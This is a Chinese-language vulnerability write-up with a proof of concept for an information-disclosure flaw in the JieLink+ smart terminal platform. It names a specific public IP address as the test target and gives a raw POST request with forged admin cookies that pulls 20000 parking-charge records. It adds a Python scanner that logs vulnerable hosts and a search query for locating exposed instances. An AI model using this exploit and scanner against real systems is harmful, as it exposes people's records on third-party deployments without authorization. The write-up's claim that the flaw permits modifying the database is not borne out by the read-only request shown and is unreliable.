# JieLink+智能终端操作平台多个接口处存在敏感信息泄露漏洞

JieLink+智能终端操作平台多个接口处存在敏感信息泄露漏洞，恶意攻击者可能会利用此漏洞修改数据库中的数据，例如添加、删除或修改记录，导致数据损坏或丢失。

## 一、测试地址

```
http://183.237.86.230:8090/
```

## 二、验证

![image-20240902193945726](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240902193945726.png)

## 三、存在漏洞

```
POST /report/ParkChargeRecord/GetDataList HTTP/1.1
Host: 183.237.86.230:8090
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: application/json, text/javascript, \*/\*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Authorization: Bearer test
Cookie: JSESSIONID=test;UUID=1; userid=admin
X-Requested-With: XMLHttpRequest
Content-Length: 17
Origin: http://x.xx.xx.x:xxx
Connection: close
Referer: http://x.xx.xx.x:xxx/Report/ParkOutRecord/Index
Sec-GPC: 1
Priority: u=1

page=1&rows=20000
```

![image-20240902194135955](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240902194135955.png)

## 四、POC

```
def poc(target):
    payload = "/report/ParkChargeRecord/GetDataList"
    headers = {
    "User-Agent":"Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:126.0)Gecko/20100101Firefox/126.0",
    "Accept":"application/json,text/javascript,\*/\*;q=0.01",
    "Accept-Language":"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "Accept-Encoding":"gzip,deflate,br",
    "Content-Type":"application/x-www-form-urlencoded;charset=UTF-8",
    "Authorization":"Bearertest",
    "Cookie":"JSESSIONID=test;UUID=1;userid=admin",
    "X-Requested-With":"XMLHttpRequest",
    "Content-Length":"21",
    "Connection":"close",
    "Sec-GPC":"1",
    "Priority":"u=1"
    }
    data = "page=1&rows=20000"
    res1 = requests.get(url=target, verify=False, timeout=5)
    try:
        if res1.status_code == 200:
            res2 = requests.post(url=target + payload, verify=False, headers=headers,data=data, timeout=5)
            # print(res2.text)
            res3 = json.loads(res2.text)
            content = res3['total']
            if content != 0:
                with open("result.txt","a",encoding='utf-8') as f:
                    f.write(f"该网站[+]{target}存在漏洞\n")


            else:

                print(f"该网站[+]{target}不存在漏洞")
        else:
            print(f"该网站{target}有问题，请手动测试")
    except Exception as e:
        print(e)
```



## 五、资产搜索

```
title="JieLink+智能终端操作平台"
```



